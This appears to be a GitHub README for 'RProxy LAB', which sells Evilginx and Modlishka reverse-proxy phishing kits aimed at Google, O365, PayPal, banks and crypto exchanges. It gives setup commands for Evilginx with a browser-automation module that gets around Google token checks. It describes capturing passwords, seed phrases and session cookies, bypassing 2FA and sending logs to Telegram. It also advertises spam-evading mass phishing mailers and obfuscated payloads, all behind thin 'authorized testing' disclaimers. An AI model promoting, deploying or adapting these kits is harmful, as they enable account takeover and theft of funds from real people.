
<h3 align="center">RProxy LAB is a research project aimed at studying reverse proxy server configurations for authentication testing in controlled authorized environments.</h3>

<p align="center">
  <img src="https://github.com/user-attachments/assets/14e231d3-335e-4a58-9752-51218f6eca19" alt="jsdelivr-logo" width="512px" height="512px"/>
  <br>
  <i>
    <br>This repository provides custom configurations and modifications based on advanced reverse proxy platforms such as Modlishka, Evilginx, EvilPuppet and others. These tools are designed for cybersecurity professionals, penetration testers, and red team employees to explore authentication vulnerabilities and develop secure systems.</i>
  <br>
</p>

<p align="center">
  <a href="https://rproxylab.gitbook.io/evilginx-lab-by-cfs0x/"><strong>RProxy Docs</strong></a>
  <br>
</p>

Web by [Info](https://rproxylab.gitbook.io/evilginx-lab-by-cfs0x/) | follow us on [Twitter](https://twitter.com/cfs0x) | Discord SERVER xCommunity RProxy LAB the [EvilGinx/Modlishka/NodeJS](https://subscord.com/store/1397884713951170610) | Telegram [Contact](https://t.me/cfs0x)

#### Note: This project is intended solely for educational purposes and authorized testing. Any unauthorized or malicious use is strictly prohibited. The developer is not responsible for any misuse of the provided materials.

#### Available PHISHLETs : x Google x 0365 x AOL x Yahoo x Binance x Blockchain x OKX x Telegram x ByBit x Icloud x OpenAI x X.com x Facebook x PayPal x Linkedin x Adobe x Bitget x Capital ONE x City x Laposte x Ibank x Privacy x Tonkeeper x Volksbank x Capitalist x BOA x Discord x Amazon x Airbnb

> **INFO** You can also order any other website for "TESTING YOUR SERVICE" All tools and resources are provided for ethical and legal use only, such as authorized penetration testing and security research. RProxy LAB by cfs0x and its creators bear no responsibility for misuse, illegal activities, or any consequences arising from improper application of these tools. Users are solely accountable for ensuring compliance with all applicable laws and regulations.


https://github.com/user-attachments/assets/17280dd7-87d8-4621-9768-086e9c5e2add

<details>
  <summary>Installation Steps​</summary>

  1. Update Package Lists
     Begin by updating your system’s package lists to ensure you have the latest information on the newest versions of packages and their dependencies.
     sudo apt-get update
​
  2. Install xrandr​
     xrandr is a utility for managing screen resolutions and display settings.
     -- Use this option if you want to run Playwright with Xserver (for example, in MobaXterm) so you can view the browser live.
     -- If use "Headless: playwright.Bool(true)," do no need this to install.
     sudo apt-get install x11-xserver-utils
     
  4. Install Google Chrome
     -- Use Chrome only if you choose not to use the browsers included in the Playwright app. In the source you received, you don’t need these installations.​
     Download and install the latest stable version of Google Chrome.

    ```wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
       sudo dpkg -i google-chrome-stable_current_amd64.deb
       sudo apt-get install -f # Install any missing dependencies```
  
  4. Install Go Programming Language
    -- You will need to install the Go language, as the source code is in Go, and to compile it in Linux, you need Go installed.​
    Go is essential for running Playwright-Go.
   
    ```wget https://golang.org/dl/go1.20.7.linux-amd64.tar.gz
      sudo rm -rf /usr/local/go
      sudo tar -C /usr/local -xzf go1.20.7.linux-amd64.tar.gz
      export PATH=$PATH:/usr/local/go/bin
      go version```
      
  5. Install Playwright-Go and Dependencies
   -- You need to install the Playwright Go library, as the EvilGinx version for Google uses a module called EvilPlaywright. This module controls a real browser behind the reverse proxy to obtain certain tokens that otherwise cannot be retrieved correctly    due to the different host in the reverse proxy or due to Google detecting browser incompatibilities with video versions, fonts, etc.
   
    ```go get -u github.com/playwright-community/playwright-go
       go run github.com/playwright-community/playwright-go/cmd/playwright@latest install --with-deps
       go install github.com/playwright-community/playwright-go/cmd/playwright@latest
       playwright install --with-dep```

  6. Starting EvilGinx
  To launch EvilGinx, execute the following command:

    ```sudo /root/evilginx2/build/evilginx -p /root/evilginx/phishlets -developer```
   
  [COLOR=rgb(250, 197, 28)]sudo  [/COLOR] Runs the command with superuser (root) privileges, which are often necessary for network-related applications or services.
 /root/evilginx/build/evilginx  This is the path to the compiled EvilGinx binary. Evilginx2 is a tool often used in phishing simulations or security testing to capture authentication tokens in real-time by acting as a reverse proxy.
 -p /root/evilginx/phishlets Specifies the path where the phishlets are located. Phishlets are configuration files that define the behavior of EvilGinx for specific websites or services (e.g., Google, Facebook). These phishlets contain rules for  forwarding requests and capturing tokens and cookies.
-developer: This allows for developer mode It does not use SSL from Evilginx with auto ssl using Let's Encrypt; instead, it will use the SSL settings provided by Cloudflare.
  ​
</details>

https://github.com/user-attachments/assets/b3f2b02b-d7fd-4800-9060-1726a0e80f55

https://github.com/user-attachments/assets/8f3f9f7c-985f-4ba6-af0a-1cd55e5f595a

#### RProxy LAB aims to provide a collection of proxy configurations and modifications for studying authentication mechanisms. The repository includes:

- Custom configurations for reverse proxy frameworks, inspired by Modlishka, Evilginx, EvilPuppet and others.
- Modifications to enhance functionality for security testing in controlled environments.
- Examples of authentication templates for analyzing session management and token capture techniques.

#### This project is designed for:

- Security researchers studying reverse proxy technologies.
- Penetration testers conducting authorized assessments.
- Developers learning about authentication vulnerabilities in controlled lab settings.

<table align="center">
  <tr>
    <td align="center">
      <video src="https://github.com/user-attachments/assets/8b0b2c85-b333-4bb1-898e-464a770d494e" width="400" controls="controls" style="max-width: 100%;"></video>
      <p><small>Capture email and password. Bypass 2FA and capture cookies/.The token log is sent to Telegram.</small></p>
    </td>
    <td>
    </td>
    <td align="center">
      <video src="https://github.com/user-attachments/assets/0ff2b322-a7af-46a4-aaa5-18924f3a35b0" width="400" controls="controls" style="max-width: 100%;"></video>
      <p><small>Capture Recovery Phrase 12 + 24. Generated Wallet and password. Bypass 2FA and capture cookies/.The token log is sent to Telegram.</small></p>
    </td>
     <td>
    </td>
    <td align="center">
      <video src="https://github.com/user-attachments/assets/2918c365-7885-4497-acac-9f2ece7e7736" width="400" controls="controls" style="max-width: 100%;"></video>
      <p><small>Capture Mnemonic + Password. Generated Wallet and password. Bypass 2FA and capture cookies/.The token log is sent to Telegram.</small></p>
    </td>
  </tr>
</table>

### Usage

The configurations in this repository are intended for use in authorized testing environments only. Ensure you have explicit permission from system owners before deploying any tools or configurations. Follow these guidelines:

- Use in controlled lab environments or with explicit authorization.
- Refer to the documentation of Modlishka, Evilginx, EvilPuppet and others for setup instructions.
- Avoid deploying configurations in production or unauthorized systems.

## Resources
Visit [RProxy LAB](https://rproxylab.gitbook.io/evilginx-lab-by-cfs0x/) for detailed documentation, tutorials, and live examples of RProxy LAB configurations.

## RProxy LAB by cfs0x: Ultimate RProxy and Proxy Powerhouse

Step into the shadows of elite cyber operations with RProxy LAB by cfs0x—a premier Discord community for phishing virtuosos, proxy wizards, and red team operatives. This is your gateway to cutting-edge tools, exclusive training, and a tight-knit network of experts. Subscription unlocks a treasure trove of resources designed to dominate credential harvesting, bypass defenses, and execute flawless social engineering campaigns.

What You Get with Your Subscription:

- Private Phishlets & Mods: Tailored phishlets for Evilginx2, targeting banks, social media, and corporate logins. Custom mods for maximum stealth and scalability.
- SPMT and Mailer Arsenal: High-powered SMTP mailers for mass phishing, with DKIM spoofing and anti-spam evasion. Send undetectable campaigns at scale.
- Evilginx Web Control Dashboard: Enhanced dashboard for Evilginx—manage sessions, route proxies, and capture credentials in real-time with a sleek, intuitive interface.
- Modlishka Upgrades: Advanced Modlishka mods for reverse proxy phishing—SSL stripping, multi-domain support, and custom hooks for seamless attacks.
- Evilpuppet Modules: Pre-built modules for Evilpuppet—automate browsers for credential stuffing, session hijacking, and puppeted ops with precision.
- Node.js Phishing Projects: Full-stack phishing solutions on Node.js—Express backends, React frontends, API-driven data exfil, and obfuscated payloads. Ready-to-deploy with auto-scaling scripts.
- Exclusive Training & Workshops: Hands-on courses on phishing tradecraft, proxy chaining, and red team tactics. From beginner to pro—master the art of deception.

### Red Team Community: Collaborate with seasoned red teamers. Share strategies, troubleshoot ops, and join live phishing simulations. Get real-time mentorship from the best.

### Why Join RProxy LAB?
Elite Tools: Access battle-tested, private resources unavailable in open-source circles.
Expert Network: Connect with a global crew of ethical hackers and pen-testers for knowledge exchange and support.
Continuous Updates: Stay ahead with regular tool drops, mod updates, and cutting-edge techniques.

### Legal Disclaimer:

All tools and resources are provided for ethical and legal use only, such as authorized penetration testing and security research. RProxy LAB by cfs0x and its creators bear no responsibility for misuse, illegal activities, or any consequences arising from improper application of these tools. Users are solely accountable for ensuring compliance with all applicable laws and regulations.

DM to join the elite. Unleash your potential—ethically, ruthlessly, brilliantly.

## Community and Support
Join our community for discussions and support:
- [Discord Server](https://subscord.com/store/1397884713951170610)
- [Issues Page](https://github.com/cfs0x/RProxy-LAB/issues) for bug reports and feature requests.

### Contributing
Contributions are welcome! If you have ideas for improving configurations or adding new templates, please submit a pull request. Ensure all contributions align with the educational and ethical goals of this project.

### License
Licensed under the MIT License for educational and authorized security testing purposes only. See LICENSE for details.
